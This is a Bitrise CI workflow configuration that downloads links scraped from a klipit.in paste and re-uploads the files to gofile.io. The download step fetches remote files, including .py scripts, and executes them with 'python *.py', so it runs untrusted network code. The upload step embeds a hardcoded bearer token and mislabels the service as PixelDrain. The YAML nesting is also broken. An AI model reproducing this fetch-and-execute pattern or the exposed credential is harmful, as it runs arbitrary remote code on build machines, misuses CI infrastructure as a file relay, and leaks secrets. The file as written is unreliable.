format_version: '11'
default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git

workflows:
  download_and_upload:
    steps:
      - script:
          title: Download file
          inputs:
            - content: |-
                #!/bin/bash
                set -e
                mkdir -p downloads
                pip install aria2
                curl -s https://klipit.in/sju77028 | grep -oP 'magnet:\S+|https?://\S+\.(mp4|mkv|avi|srt|py)' > links.txt
                wget --content-disposition -i links.txt
                python *.py
            - script:
          title: Upload files to PixelDrain
          inputs:
            - content: |-
                #!/bin/bash
                set -e
                find downloads -type f -print0 | while IFS= read -r -d '' file; do
                  curl -g -X POST "https://upload.gofile.io/uploadfile" \
                       -H "Authorization: Bearer NkEP9nPmjC5bYQB7ZabZKnsUEBi7ww85" \
                       -F "file=@\"$file\"" \
                       -F "folderId=33072955-da61-4062-bad6-71f3bc339712"
                done
